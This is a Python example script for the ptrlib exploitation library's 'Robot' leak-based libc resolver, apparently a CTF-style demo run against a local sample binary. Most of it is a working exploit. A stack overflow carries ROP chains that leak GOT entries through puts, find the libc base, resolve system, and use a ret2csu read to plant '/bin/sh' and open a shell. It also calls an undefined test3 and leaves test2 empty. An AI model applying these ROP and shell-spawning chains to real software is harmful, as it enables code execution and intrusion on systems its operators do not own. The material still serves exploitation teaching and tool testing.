#!/usr/bin/env python
"""Robot
This feature is similar to DynELF in pwntools but more flexible.
It dynamically resolves function addresses based on leaks.
It's useful when libc version is unknown, for example.
"""
import sys
from ptrlib import *

rop_csu_popper = 0x4006ba
rop_csu_caller = 0x4006a0
rop_pop_rdi = 0x004006c3
elf = ELF("sample/test-robot")

def leak(addr):
    """
    You need to write leak function.
    It must leak data located at a given address.
    The data length must be 1 or bigger. (The larger, the better.)
    """
    payload = b'A' * 0x28
    payload += p64(rop_pop_rdi)
    payload += p64(addr)
    payload += p64(elf.plt('puts'))
    payload += p64(elf.symbol('main')) # must return to vuln for more leaks
    sock.send(payload)
    sock.recvuntil("Bye!\n")
    r = sock.recvline() # actually not proper but ok
    return r + b'\x00' # we know there's 0x00 because we use puts

def test1():
    """Test case 1
    Assume we have ELF (No PIE).
    (In this case you can also use ret2dl-resolve.)
    """
    robot = Robot(leak, elf)

    # Leak libc address (we don't know libc version)
    libc_something = u64(leak(elf.got('puts')))
    logger.info("Looks like a libc address: " + hex(libc_something))

    # Find libc base
    libc_base = robot.find_base(libc_something)
    logger.info("libc_base = " + hex(libc_base))
    #libc_base = 0x7ffff79e4000

    # Resolve whatever function you want to call
    addr_system = robot.lookup("system", libc_base)
    logger.info("<system> = " + hex(addr_system))

    # DIY
    payload  = b"A" * 0x28
    payload += p64(rop_csu_popper)
    payload += flat([
        p64(0), # rbx
        p64(1), # rbp
        p64(elf.got('read')),             # r12 --> function
        p64(0),                           # r13 --> edi
        p64(elf.section('.bss') + 0x100), # r14 --> rsi
        p64(0x8),                         # r15 --> rdx
    ])
    payload += p64(rop_csu_caller) # read(0, bss+0x100, 0x8)
    payload += b'A' * (8 * 7)
    payload += p64(rop_pop_rdi)
    payload += p64(elf.section('.bss') + 0x100)
    payload += p64(addr_system)    # system("/bin/sh")
    sock.send(payload)
    sock.send('/bin/sh\0')

def test2():
    """
    """

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Test: {} [test1 | test2 | test3]".format(sys.argv[0]))
    else:
        sock = Process("sample/test-robot")

        if sys.argv[1] == 'test1':
            test1()
        elif sys.argv[1] == 'test2':
            test2()
        elif sys.argv[1] == 'test3':
            test3()
        else:
            print("Invalid test case")
            
        sock.interactive()
